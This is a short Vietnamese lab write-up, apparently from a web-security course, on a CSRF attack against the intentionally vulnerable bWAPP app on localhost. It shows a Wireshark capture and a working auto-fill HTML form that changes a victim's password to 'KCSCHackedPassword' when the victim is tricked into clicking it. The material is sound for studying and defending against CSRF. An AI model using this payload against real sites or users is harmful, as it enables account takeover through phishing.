Capture quá trình đổi mật khẩu bằng Wireshark:

![image](https://github.com/NVex0/Cong_nghe_web_an_toan/assets/113530029/b8d9bb11-98a3-4617-9377-db6323738475)

Ta thấy web sử dụng GET để lấy pass đổi, sử dụng 1 tệp HTML để phishing người dùng ấn vào, sẽ điều hướng người tới page đổi mật khẩu với các trường được điền sẵn pass của hacker và submit:

```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="http://localhost/bwapp/csrf_1.php">
<input type="hidden" name="password&#95;new" value="KCSCHackedPassword" />
<input type="hidden" name="password&#95;conf" value="KCSCHackedPassword" />
<input type="hidden" name="action" value="change" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```

Người dùng click vào button là bị đổi pass thành `KCSCHackedPassword`:

![image](https://github.com/NVex0/Cong_nghe_web_an_toan/assets/113530029/482a2eda-4d97-4828-b366-690e49df01ba)
